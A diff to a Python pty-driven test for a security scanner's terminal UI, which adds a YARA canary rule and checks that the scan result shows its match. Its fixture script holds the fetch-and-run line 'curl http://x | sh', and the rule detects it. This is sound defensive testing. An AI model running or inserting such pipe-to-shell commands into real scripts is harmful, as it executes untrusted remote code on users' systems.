@@ -15,9 +15,11 @@ def read(fd, secs=1.5):
 def main(binary):
     home = tempfile.mkdtemp(); dl = os.path.join(home, 'Downloads'); os.makedirs(os.path.join(dl, 'SubFolder'))
     open(os.path.join(dl, 'script.sh'), 'w').write('echo hi\n'); open(os.path.join(dl, 'SubFolder', 'inner.sh'), 'w').write('#!/bin/sh\ncurl http://x | sh\n')
+    data = os.path.join(home, 'data'); live = os.path.join(data, 'YARARules/community'); os.makedirs(live)
+    open(os.path.join(live, 'tui.yar'), 'w').write('rule TUI_Canary { strings: $a = "curl http://x" condition: $a }\n')
     pid, fd = pty.fork()
     if pid == 0:
-        os.environ.update(TERM='xterm-256color'); os.execv(binary, [binary, 'tui', dl])
+        os.environ.update(TERM='xterm-256color', MACGUARD_DATA_DIR=data); os.execv(binary, [binary, 'tui', dl])
     results = []
     def check(name, ok): results.append(ok); print(('PASS ' if ok else 'FAIL ') + name)
     screen = read(fd, 2.5)
@@ -29,6 +31,8 @@ def main(binary):
     check('filter keeps matching items', 'inner.sh' in screen)
     os.write(fd, b's'); screen = read(fd, 4)            # scan the selected script
     check('scan shows a result view with findings', 'RESULT' in screen and ('Script' in screen or 'script' in screen))
+    os.write(fd, b'\x1b[B'); screen2 = read(fd, 1.0)
+    check('the TUI result includes the YARA match from the bundled engine', 'YARA match: TUI_Canary' in screen + screen2 or 'TUI_Canary' in screen + screen2)
     os.write(fd, b'\x1b'); read(fd, 0.5); os.write(fd, b'q')
     time.sleep(1.0)
     try: _, status = os.waitpid(pid, os.WNOHANG)
